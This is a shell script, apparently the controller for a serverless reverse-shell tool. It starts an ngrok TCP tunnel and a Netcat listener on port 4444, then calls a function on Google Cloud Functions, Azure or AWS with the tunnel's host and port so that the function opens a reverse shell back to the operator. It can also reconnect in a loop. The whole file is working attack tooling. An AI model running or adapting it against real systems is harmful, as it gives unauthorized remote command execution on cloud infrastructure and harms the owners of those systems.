#!/bin/sh

# Enable job control.
set -m

cleanup_files () {
    rm /tmp/curl_output.txt 2>/dev/null
    rm /tmp/ngrok_output.txt 2>/dev/null
}

cleanup () {
    cleanup_files
    kill $(jobs -p) 2>/dev/null;
}

# Kill all subprocesses and clean up files on exit.
trap 'cleanup' EXIT

MODE=$1
shift

# Read named arguments (https://stackoverflow.com/a/14203146)
while [[ $# -gt 0 ]]
do
    key="$1"

    case $key in
        -u|--url-id)
        URL_ID="$2"
        shift # past argument
        shift # past value
        ;;

        -a|--api-key)
        API_KEY="$2"
        shift # past argument
        shift # past value
        ;;

        -r|--region)
        REGION="$2"
        shift # past argument
        shift # past value
        ;;

        -l|--loop)
        LOOP="$2"
        shift # past argument
        shift # past value
        ;;
    esac
done

if [[ -z $URL_ID ]]
then
    echo 'usage: cheetah/cougar/panther [--url-id/-u PROJECT_ID/URL_ID] [--api-key/-a API_KEY] [--region/-r REGION] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
    exit
fi

# Run ngrok and derive the public-facing host and port it is using.
ngrok tcp 4444 --log stdout > /tmp/ngrok_output.txt 2>&1 &
sleep 3

if ! ps -p $! >&-
then
    echo "Error: ngrok failed to start properly."
    cleanup_files
    exit
fi

NGROK_HOST_AND_PORT=`cat /tmp/ngrok_output.txt | grep url | awk '{print $8}' | awk 'BEGIN { FS="url=tcp://" }; { print $2 }'`
NGROK_HOST=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $1 }')
NGROK_PORT=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $2 }')

if [[ -z $NGROK_HOST || -z $NGROK_PORT ]]
then
    echo "Error: Failed to get host or port from ngrok."
fi

case $MODE in
    cheetah)
    REGION=${REGION:-us-central1}
    URL="http://$REGION-$URL_ID.cloudfunctions.net/Cheetah?host=$NGROK_HOST&port=$NGROK_PORT"
    ;;

    cougar)
    URL="https://$URL_ID.azurewebsites.net/api/Cougar?host=$NGROK_HOST&port=$NGROK_PORT&code=$API_KEY"
    ;;

    panther)
    REGION=${REGION:-us-east-1}
    URL="https://$URL_ID.execute-api.$REGION.amazonaws.com/dev/api/Panther?host=$NGROK_HOST&port=$NGROK_PORT"
    ;;
esac

JOB=2

while ! [[ -z $LOOP ]] || [[ $JOB -eq 2 ]]
do
    nc -l 4444 &

    # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
    curl -s "$URL" -H "X-API-Key: $API_KEY" > /tmp/curl_output.txt &

    sleep 1

    # Exit if the curl request terminated already.
    if [[ -s /tmp/curl_output.txt ]]
    then
        printf "Error: "
        cat /tmp/curl_output.txt
        break;
    fi

    # Exit if the curl command failed altogether.
    if ! ps -p $! >&-
    then
        echo "Error: curl command failed."
        cleanup_files
        exit
    fi

    # Bring the Netcat listener back to the foreground.
    printf '> '
    fg $JOB > /dev/null

    # Break out of the loop on CTRL-C.
    test $? -gt 128 && break;

    echo
    echo 'Connection terminated.'
    JOB=$(($JOB + 2))

    if ! [[ -z $LOOP ]]
    then
        echo 'Restarting...'
    fi
done

cleanup_files
